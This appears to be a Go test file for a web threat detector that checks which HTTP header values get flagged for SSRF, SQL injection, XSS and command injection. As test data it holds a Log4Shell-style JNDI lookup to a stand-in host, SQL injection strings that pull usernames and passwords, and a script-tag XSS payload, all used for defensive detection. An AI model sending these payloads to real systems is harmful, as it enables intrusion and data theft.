package guardcore

import (
	"testing"
)

func runDetectThreatHeaders(t *testing.T, cfg *SecurityConfig, headers map[string]string) []string {
	t.Helper()
	req := newTestRequest(t, func(opts *RequestOptions, state *RequestState) {
		opts.Header = headers
	})
	categories, _ := detectThreat(req, cfg, resolveDetectionExclusions(cfg, nil))
	return categories
}

func newDetectConfig(t *testing.T, mutate func(c *SecurityConfig)) *SecurityConfig {
	t.Helper()
	cfg, err := NewSecurityConfig(mutate)
	if err != nil {
		t.Fatalf("NewSecurityConfig: %v", err)
	}
	return cfg
}

func TestAddressCarryingProxyHeaderValueIsNotFlagged(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	headers := map[string]string{
		"x-forwarded-for":          "192.168.65.1",
		"x-real-ip":                "10.0.0.5, 172.16.0.1",
		"cf-connecting-ip":         "127.0.0.1",
		"x-envoy-external-address": "127.0.0.1:8080",
		"host":                     "169.254.169.254",
	}
	if categories := runDetectThreatHeaders(t, cfg, headers); len(categories) != 0 {
		t.Fatalf("proxy identity address values must not be flagged, got %v", categories)
	}
}

func TestForwardedProtoExcludedHeaderValueNotFlagged(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	if categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-forwarded-proto": "https",
		"forwarded":         "for=127.0.0.1;proto=https",
	}); len(categories) != 0 {
		t.Fatalf("structured proxy header values must not be flagged, got %v", categories)
	}
}

func TestProxyIdentityHeaderStillScansAlwaysScanPattern(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	for _, name := range []string{"x-forwarded-for", "user-agent", "x-real-ip"} {
		categories := runDetectThreatHeaders(t, cfg, map[string]string{
			name: "${jndi:ldap://evil.example/a}",
		})
		if len(categories) == 0 {
			t.Fatalf("excluded header %s must still detect always-scan patterns", name)
		}
		if !containsString(categories, "cmd_injection") {
			t.Fatalf("excluded header %s must detect cmd_injection, got %v", name, categories)
		}
	}
}

func TestNonExcludedHeaderWithPrivateAddressIsStillFlagged(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-not-a-proxy-header": "192.168.65.1",
	})
	if !containsString(categories, "ssrf") {
		t.Fatalf("non-excluded header with private address must flag ssrf, got %v", categories)
	}
}

func TestAddressCarryingProxyHeaderStillDetectsSQLi(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-forwarded-for": "203.0.113.10' OR '1'='1",
	})
	if !containsString(categories, "sqli") {
		t.Fatalf("excluded header with SQLi payload must still detect sqli, got %v", categories)
	}
}

func TestConfiguredExcludedHeaderAddressChainSuppressesSSRFOnly(t *testing.T) {
	cfg := newDetectConfig(t, func(c *SecurityConfig) {
		c.ExcludedDetectionHeaders = map[string]bool{"x-custom-proxy-ip": true}
	})
	if categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-custom-proxy-ip": "10.0.0.5",
	}); len(categories) != 0 {
		t.Fatalf("configured excluded header with address value must not be flagged, got %v", categories)
	}
	if categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-custom-proxy-ip": "10.0.0.5, 172.16.0.1",
	}); len(categories) != 0 {
		t.Fatalf("configured excluded header with address chain must not be flagged, got %v", categories)
	}
}

func TestConfiguredExcludedHeaderWithNonAddressValueStillDetectsXSS(t *testing.T) {
	cfg := newDetectConfig(t, func(c *SecurityConfig) {
		c.ExcludedDetectionHeaders = map[string]bool{"x-custom-proxy-ip": true}
	})
	categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-custom-proxy-ip": "<script>alert(1)</script>",
	})
	if !containsString(categories, "xss") {
		t.Fatalf("configured excluded header with non-address payload must still detect xss, got %v", categories)
	}
}

func TestEmptyExcludedConfigKeepsOrdinaryHeaderScan(t *testing.T) {
	cfg := newDetectConfig(t, nil)
	categories := runDetectThreatHeaders(t, cfg, map[string]string{
		"x-plain-header": "1 UNION SELECT username, password FROM users--",
	})
	if !containsString(categories, "sqli") {
		t.Fatalf("unconfigured header must keep the full category scan, got %v", categories)
	}
}

func TestStripForwardedEntryPort(t *testing.T) {
	cases := map[string]string{
		"1.2.3.4":        "1.2.3.4",
		"1.2.3.4:8080":   "1.2.3.4",
		"[::1]:8080":     "::1",
		"[::1]":          "::1",
		"[::1]junk":      "[::1]junk",
		"2001:db8::1":    "2001:db8::1",
		"1.2.3.4:80x":    "1.2.3.4:80x",
		"example.com":    "example.com",
		"example.com:80": "example.com",
	}
	for input, want := range cases {
		if got := stripForwardedEntryPort(input); got != want {
			t.Fatalf("stripForwardedEntryPort(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestValueLooksLikeAddressChain(t *testing.T) {
	yes := []string{"192.168.65.1", "10.0.0.5, 172.16.0.1", "127.0.0.1:8080", "[::1]:9090, 10.0.0.1"}
	no := []string{"", "not-an-ip", "10.0.0.5, evil.example", "<script>alert(1)</script>"}
	for _, value := range yes {
		if !valueLooksLikeAddressChain(value) {
			t.Fatalf("valueLooksLikeAddressChain(%q) must be true", value)
		}
	}
	for _, value := range no {
		if valueLooksLikeAddressChain(value) {
			t.Fatalf("valueLooksLikeAddressChain(%q) must be false", value)
		}
	}
}

func TestMergedExcludedDetectionHeadersLowercasesConfigEntries(t *testing.T) {
	cfg := newDetectConfig(t, func(c *SecurityConfig) {
		c.ExcludedDetectionHeaders = map[string]bool{"X-Custom-Proxy": true}
	})
	merged := mergedExcludedDetectionHeaders(cfg)
	if !merged["x-custom-proxy"] {
		t.Fatalf("configured entries must merge lowercased, got %v", merged)
	}
	if !merged["x-forwarded-for"] {
		t.Fatalf("default set must stay merged in, got %v", merged)
	}
}

func containsString(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}
